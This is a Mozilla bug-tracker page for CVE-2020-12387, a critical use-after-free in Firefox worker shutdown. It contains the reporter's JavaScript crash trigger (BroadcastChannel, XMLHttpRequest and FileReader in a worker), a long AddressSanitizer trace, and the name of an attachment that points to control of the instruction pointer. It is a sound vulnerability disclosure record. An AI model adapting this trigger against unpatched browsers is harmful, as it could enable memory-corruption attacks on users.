### (Reporter: loobenyang, Assigned: asuth)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=40)  [asuth](/user_profile?user_id=151407)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=40)  [loobenyang](/user_profile?user_id=506912)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/056757eff6ed7c8ec26f61e3bf7695fe?d=mm&size=40)  [smaug](/user_profile?user_id=39966)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

20 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1545345&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1545345)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

[1649448](/show_bug.cgi?id=1649448 "RESOLVED FIXED - Assertion failure: aGlobal, at /builds/worker/checkouts/gecko/dom/file/Blob.cpp:74")

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[1547059](/show_bug.cgi?id=1547059 "RESOLVED DUPLICATE - AddressSanitizer: heap-use-after-free [@ CCGraphBuilder::NoteXPCOMChild] with READ of size 8")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1557732](/show_bug.cgi?id=1557732 "VERIFIED FIXED - Assertion failure: js::GetNonCCWObjectRealm(wrapper) == js::GetContextRealm(cx), at /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:345")

## Details

### (Keywords: csectype-uaf, reporter-external, sec-critical, Whiteboard: [post-critsmash-triage][adv-main76+][adv-ESR68.8+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-12387

[Keywords:](/describekeywords.cgi)

[csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[post-critsmash-triage][adv-main76+][adv-ESR68.8+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a10066826_1689 "6 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [asuth](/user_profile?user_id=151407) | [qe-verify](#c53 "5 years ago") | - |
| --- | --- | --- |
| [asuth](/user_profile?user_id=151407) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (5 files)

| [UAF\_NoteXPCOMChild\_Repro.js](/attachment.cgi?id=9059182)  [6 years ago](#c0)  [Looben Yang](/user_profile?user_id=506912)   1.60 KB, text/javascript |  | [Details](/attachment.cgi?id=9059182&action=edit) |
| --- | --- | --- |
| [UAF\_NoteXPCOMChild\_EIP\_41414141.js](/attachment.cgi?id=9059231)  [6 years ago](#c2)  [Looben Yang](/user_profile?user_id=506912)   2.19 KB, text/javascript |  | [Details](/attachment.cgi?id=9059231&action=edit) |
| [Bug 1545345 - Improve worker shutdown. r=baku,smaug](/attachment.cgi?id=9130470)  [5 years ago](#c44)  [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)   47 bytes, text/x-phabricator-request | dveditz : [sec-approval+](#a29524244_1689 "5 years ago") | [Details](/attachment.cgi?id=9130470&action=edit) | [Review](/attachment.cgi?id=9130470) |
| [Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug](/attachment.cgi?id=9141601)  [5 years ago](#c54)  [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)   47 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-esr68+](#c57 "5 years ago") | [Details](/attachment.cgi?id=9141601&action=edit) | [Review](/attachment.cgi?id=9141601) |
| [advisory.txt](/attachment.cgi?id=9144306)  [5 years ago](#c59)  [Frederik Braun [:freddy]](/user_profile?user_id=428608)   202 bytes, text/plain |  | [Details](/attachment.cgi?id=9144306&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1545345#c0)• 6 years ago |
|  | |

Attached file
[UAF\_NoteXPCOMChild\_Repro.js](attachment.cgi?id=9059182)
— [Details](attachment.cgi?id=9059182&action=edit)

Reproduction test case (full server code in attached file UAF\_NoteXPCOMChild\_Repro.js):

```
Main Page code:
    <script type="text/javascript">
    var worker = new Worker("worker0.js");
    var bc0 = new BroadcastChannel("test_channel");
    setInterval(function(){ bc0.postMessage("AAAA");}, 10);
    setTimeout(function(){location.reload();},800);
    </script>

Worker code:
    var bc0 = new BroadcastChannel("test_channel");
    bc0.onmessage = function(e) {
    xmlReq0.send();
    xmlReq0.abort();
    }
    var fileReader1 =  new FileReader();
    fileReader1.onloadend = function(e) {
    xmlReq0.open("get", "nofile.js", false);
    }
    var xmlReq0 = new XMLHttpRequest();
    close();
    fileReader1.readAsArrayBuffer(new Blob(["AAAA"], {type : "text/html"}));
    fileReader1.abort();

```

Steps to reproduce:

1. Run server side script UAF\_NoteXPCOMChild\_Repro.js with Node.js (node UAF\_NoteXPCOMChild\_Repro.js).

2. Enter <http://localhost:12345> in Firefox asan build.

3. ASAN reports a Use After Free with XMLHttpRequest:

```
    =================================================================
    ==7061==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000d0540 at pc 0x7faee9713b6f bp 0x7faed52472b0 sp 0x7faed52472a8
    READ of size 8 at 0x6120000d0540 thread T22 (DOM Worker)

```

Firefox version: 68.0a1 (2019-04-17) (64-bit)

OS: Ubuntu 16.04 LTS 64bit

Stack trace:

```
=================================================================
==7061==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000d0540 at pc 0x7faee9713b6f bp 0x7faed52472b0 sp 0x7faed52472a8
READ of size 8 at 0x6120000d0540 thread T22 (DOM Worker)
    #0 0x7faee9713b6e in ~nsCOMPtr_base /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:331:7
    #1 0x7faee9713b6e in mozilla::WidgetEvent::~WidgetEvent() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/BasicEvents.h:500
    #2 0x7faef0173e9d in mozilla::WidgetEvent::~WidgetEvent() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/BasicEvents.h:500:26
    #3 0x7faeee23825b in mozilla::dom::Event::~Event() /builds/worker/workspace/build/src/dom/events/Event.cpp:113:5
    #4 0x7faeee1c9a3d in mozilla::dom::Event::~Event() /builds/worker/workspace/build/src/dom/events/Event.cpp:109:17
    #5 0x7faee7bf5ba6 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2416:7
    #6 0x7faee7bf488e in nsCycleCollector::FreeSnowWhite(bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2607:3
    #7 0x7faee7bfe048 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3582:3
    #8 0x7faee7bfd630 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3411:9
    #9 0x7faee7c0119c in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3947:21
    #10 0x7faef5088dc7 in callGCCallback /builds/worker/workspace/build/src/js/src/gc/GC.cpp:1840:3
    #11 0x7faef5088dc7 in js::gc::GCRuntime::maybeCallGCCallback(JSGCStatus) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7375
    #12 0x7faef5089eff in ~AutoCallGCCallbacks /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7354:32
    #13 0x7faef5089eff in js::gc::GCRuntime::gcCycle(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7464
    #14 0x7faef508d423 in js::gc::GCRuntime::collect(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7622:9
    #15 0x7faef502347d in js::gc::GCRuntime::gc(JSGCInvocationKind, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7710:3
    #16 0x7faeef978f39 in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2325:5
    #17 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #18 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #19 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #20 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #21 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #22 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #23 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11
    #24 0x7faf0884e05d in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5
    #25 0x7faf084946b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)
    #26 0x7faf0751d41c in clone /build/glibc-Cl5G7W/glibc-2.23/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:109

0x6120000d0540 is located 0 bytes inside of 272-byte region [0x6120000d0540,0x6120000d0650)
freed by thread T22 (DOM Worker) here:
    #0 0x55c5c6461182 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3
    #1 0x7faee7bf5ba6 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2416:7
    #2 0x7faee7bf488e in nsCycleCollector::FreeSnowWhite(bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2607:3
    #3 0x7faee7bfe048 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3582:3
    #4 0x7faee7bfd630 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3411:9
    #5 0x7faee7c0119c in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3947:21
    #6 0x7faef5088dc7 in callGCCallback /builds/worker/workspace/build/src/js/src/gc/GC.cpp:1840:3
    #7 0x7faef5088dc7 in js::gc::GCRuntime::maybeCallGCCallback(JSGCStatus) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7375
    #8 0x7faef5089eff in ~AutoCallGCCallbacks /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7354:32
    #9 0x7faef5089eff in js::gc::GCRuntime::gcCycle(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7464
    #10 0x7faef508d423 in js::gc::GCRuntime::collect(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7622:9
    #11 0x7faef502347d in js::gc::GCRuntime::gc(JSGCInvocationKind, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7710:3
    #12 0x7faeef978f39 in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2325:5
    #13 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #14 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #15 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #16 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #17 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #18 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #19 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11
    #20 0x7faf0884e05d in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5
    #21 0x7faf084946b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)

previously allocated by thread T22 (DOM Worker) here:
    #0 0x55c5c6461503 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3
    #1 0x55c5c6495f9d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15
    #2 0x7faeefd8af22 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10
    #3 0x7faeefd8af22 in mozilla::dom::XMLHttpRequestWorker::Construct(mozilla::dom::GlobalObject const&, mozilla::dom::MozXMLHttpRequestParameters const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestWorker.cpp:1482
    #4 0x7faeefd8a049 in mozilla::dom::XMLHttpRequest::Constructor(mozilla::dom::GlobalObject const&, mozilla::dom::MozXMLHttpRequestParameters const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequest.cpp:51:10
    #5 0x7faeecffb4f7 in mozilla::dom::XMLHttpRequest_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:2557:64
    #6 0x7faef4007905 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13
    #7 0x7faef4007905 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458
    #8 0x7faef4007905 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651
    #9 0x7faef3fe4f1c in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3063:16
    #10 0x7faef3fced88 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10
    #11 0x7faef4009ef9 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13
    #12 0x7faef400a66c in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10
    #13 0x7faef4287694 in bool Evaluate<char16_t>(JSContext*, js::ScopeKind, JS::Handle<JSObject*>, JS::ReadOnlyCompileOptions const&, JS::SourceText<char16_t>&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:539:10
    #14 0x7faef4286a0a in JS::Evaluate(JSContext*, JS::ReadOnlyCompileOptions const&, JS::SourceText<char16_t>&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:557:10
    #15 0x7faeef98a456 in mozilla::dom::(anonymous namespace)::ScriptExecutorRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:1989:10
    #16 0x7faeef9c9f82 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #17 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #18 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #19 0x7faeef9b904e in mozilla::dom::WorkerPrivate::RunCurrentSyncLoop() /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:3646:7
    #20 0x7faeef95b555 in Run /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:1169:27
    #21 0x7faeef95b555 in mozilla::dom::(anonymous namespace)::LoadAllScripts(mozilla::dom::WorkerPrivate*, nsTArray<mozilla::dom::(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2149
    #22 0x7faeef95a972 in mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, nsTSubstring<char16_t> const&, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2259:3
    #23 0x7faeef9dd1c5 in mozilla::dom::(anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:340:5
    #24 0x7faeef9c9f82 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #25 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #26 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #27 0x7faeef9b07ea in mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2748:7
    #28 0x7faeef978f0b in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2305:40
    #29 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #30 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #31 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #32 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #33 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #34 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #35 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11

Thread T22 (DOM Worker) created by T0 (Web Content) here:
    #0 0x55c5c6449add in pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3
    #1 0x7faf08840158 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14
    #2 0x7faf08829d3e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12
    #3 0x7faee7db3609 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:661:8
    #4 0x7faeef9d9388 in mozilla::dom::WorkerThread::Create(mozilla::dom::WorkerThreadFriendKey const&) /builds/worker/workspace/build/src/dom/workers/WorkerThread.cpp:93:7
    #5 0x7faeef94df79 in mozilla::dom::workerinternals::RuntimeService::ScheduleWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1433:14
    #6 0x7faeef94c595 in mozilla::dom::workerinternals::RuntimeService::RegisterWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1298:19
    #7 0x7faeef9aa8a3 in mozilla::dom::WorkerPrivate::Constructor(JSContext*, nsTSubstring<char16_t> const&, bool, mozilla::dom::WorkerType, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, mozilla::dom::WorkerLoadInfo*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2250:24
    #8 0x7faeef95c7b7 in mozilla::dom::Worker::Constructor(mozilla::dom::GlobalObject const&, nsTSubstring<char16_t> const&, mozilla::dom::WorkerOptions const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/Worker.cpp:30:41
    #9 0x7faeecfab3d0 in mozilla::dom::Worker_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WorkerBinding.cpp:1112:52
    #10 0x7faef4007905 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13
    #11 0x7faef4007905 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458
    #12 0x7faef4007905 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651
    #13 0x7faef3fe4f1c in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3063:16
    #14 0x7faef3fced88 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10
    #15 0x7faef4009ef9 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13
    #16 0x7faef400a66c in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10
    #17 0x7faef428491d in ExecuteScript(JSContext*, JS::Handle<JS::StackGCVector<JSObject*, js::TempAllocPolicy> >, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:455:10
    #18 0x7faeeb5b26a4 in nsJSUtils::ExecutionContext::ExecScript() /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:386:8
    #19 0x7faeefe21ef3 in mozilla::dom::ExecuteCompiledScript(JSContext*, mozilla::dom::ScriptLoadRequest*, nsJSUtils::ExecutionContext&) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2495:16
    #20 0x7faeefe1efb1 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2715:20
    #21 0x7faeefe1794c in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2222:10
    #22 0x7faeefe14322 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1803:10
    #23 0x7faeefdee73e in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1526:10
    #24 0x7faeefdeda0e in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:118:18
    #25 0x7faeea1249ba in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:224:18
    #26 0x7faeea1249ba in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:727
    #27 0x7faeea11e663 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:530:7
    #28 0x7faeea12a7e0 in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:133:18
    #29 0x7faee7d86141 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32
    #30 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #31 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #32 0x7faee8e00c3a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21
    #33 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #34 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #35 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #36 0x7faef0180599 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27
    #37 0x7faef3d7bc9f in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20
    #38 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #39 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #40 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #41 0x7faef3d7b646 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:757:34
    #42 0x55c5c64943a7 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28
    #43 0x55c5c64943a7 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263
    #44 0x7faf0743682f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291

SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:331:7 in ~nsCOMPtr_base
Shadow bytes around the buggy address:
  0x0c2480012050: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2480012060: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2480012070: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c2480012080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c2480012090: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa
=>0x0c24800120a0: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd
  0x0c24800120b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c24800120c0: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
  0x0c24800120d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c24800120e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c24800120f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
